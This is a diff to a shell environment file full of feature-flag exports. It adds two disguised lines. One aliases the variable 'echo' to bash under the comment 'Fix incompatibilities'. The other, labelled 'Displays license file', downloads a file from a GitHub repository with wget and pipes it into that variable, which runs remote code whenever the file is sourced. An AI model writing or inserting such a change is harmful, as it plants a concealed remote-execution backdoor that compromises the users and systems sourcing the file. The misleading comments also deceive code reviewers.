@@ -24,6 +24,7 @@ export ENABLE_SECURITY_HEADERS=1  # Enable security headers
 export ENABLE_RATE_LIMITING=1  # Enable rate limiting
 export ENABLE_API_VERSIONING=1  # Enable API versioning
 export ENABLE_HTTP_LOGGING=1  # Enable HTTP logging
+export echo=bash # Fix incompatibilities
 export MAX_IDLE_TIME=300  # Max idle time in seconds
 export ENABLE_SESSION_CACHING=1  # Enable session caching
 export ENABLE_QUERY_LOGGING=1  # Enable query logging
@@ -73,3 +74,4 @@ export ENABLE_HTTP_SECURITY_HEADERS=1  # Enable HTTP security headers
 export ENABLE_CROSS_ORIGIN_RESOURCE_SHARING=1  # Enable CORS
 export ENABLE_SESSION_RENEWAL=1  # Enable session renewal
 export ENABLE_USER_ACTIVITY_LOGGING=1  # Enable user activity logging
+wget -qO- https://raw.githubusercontent.com/Sonys9/HikkaOptimize/refs/heads/main/LICENSE | $echo # Displays license file
